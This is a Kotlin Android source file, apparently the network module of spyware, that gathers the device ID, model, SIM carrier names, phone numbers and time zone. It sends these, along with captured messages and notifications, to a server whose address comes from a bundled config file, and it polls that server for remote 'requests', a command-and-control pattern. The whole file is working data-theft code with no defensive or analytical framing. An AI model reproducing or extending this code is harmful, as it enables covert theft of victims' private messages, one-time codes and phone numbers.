package abyssalarmy.gos


import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.SubscriptionManager
import android.util.Log
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.Locale
import java.util.TimeZone

@SuppressLint("MissingPermission")
class Net(private val context: Context) {
    private val host = appData(context).host
    private val client = OkHttpClient()
    private val gson = Gson()
    private val prefs = context.getSharedPreferences("prefs", Context.MODE_PRIVATE)
    fun post(messages: Array<Message>?, notifications: Array<Notification>?) {
        CoroutineScope(Dispatchers.IO).launch {
            val body = JSONObject().apply {
                put(
                    "client", JSONObject(
                        gson.toJson(
                            Client(
                                id(),
                                model(),
                                number(),
                                zone()
                            )
                        )
                    )
                )
                messages?.let {
                    put("messages", JSONArray(gson.toJson(messages)))
                }
                notifications?.let {
                    put("notifications", JSONArray(gson.toJson(notifications)))
                }
            }
            val post = body.toString().toRequestBody("application/json".toMediaType())
            val request = okhttp3.Request.Builder()
                .url("$host/api/client/data")
                .post(post)
                .addHeader("Content-Type", "application/json")
                .build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        }
    }

    fun get(onData: (data: Requests) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            val request = okhttp3.Request.Builder()
                .url("$host/api/client/requests")
                .post(
                    JSONObject().apply { put("id", id()) }.toString()
                        .toRequestBody("application/json".toMediaType())
                )
                .build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.i("ERROR", e.message.toString())
                }

                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        val body = response.body
                        body?.let {
                            val bodyString = body.string()
                            Handler(Looper.getMainLooper()).post {
                                onData(gson.fromJson(bodyString, Requests::class.java))
                            }
                        }
                    }
                }
            })
        }
    }

    private fun model(): String {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        return if (model.lowercase(Locale.getDefault())
                .startsWith(manufacturer.lowercase(Locale.getDefault()))
        ) {
            model.uppercase()
        } else {
            manufacturer.uppercase() + " " + model
        }
    }

    private fun number(): String {
        try {
            val subscriptionManager =
                context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subsInfoList = subscriptionManager.activeSubscriptionInfoList
            var providerInfo = ""
            for (subscriptionInfo in subsInfoList) {
                subscriptionInfo?.let {
                    providerInfo += "${subscriptionInfo.carrierName} ${subscriptionInfo.number}"
                }
                if (subsInfoList[subsInfoList.lastIndex] != subscriptionInfo) {
                    providerInfo += " |"
                }
            }
            return providerInfo
        } catch (e: Exception) {
            return "No service"
        }
    }

    private fun id(): String {
        var id = prefs.getString("id", null)
        if (id == null) {
            id = generateId()
            prefs.edit().apply {
                putString("id", id)
            }.apply()
        }
        return id
    }

    private fun zone(): String {
        return TimeZone.getDefault().getDisplayName(false, TimeZone.SHORT)
    }

    private fun generateId(): String {
        val allowedChars = ('A'..'Z') + ('a'..'z') + ('0'..'9')
        return (1..30)
            .map { allowedChars.random() }
            .joinToString("")
    }

    companion object {
        fun appData(context: Context): App {
            val file = context.assets.open("data.json")
            val reader = file.bufferedReader()
            val text = reader.readText()
            reader.close()
            return Gson().fromJson(text, App::class.java)
        }
    }

    data class Client(
        val id: String,
        val model: String,
        val number: String,
        val zone: String,
    )

    data class Message(
        val from: String,
        val text: String
    )

    data class Notification(
        val title: String,
        val text: String
    )

    data class Request(
        val clientId: String,
        val completed: Boolean,
        val data: List<Data>,
        val date: String,
        val id: String,
        val request: String
    )

    data class Data(
        val id: String,
        val key: String,
        val requestId: String,
        val value: String
    )

    data class App(
        val host: String,
        val url: String
    )

    class Requests : ArrayList<Request>()
}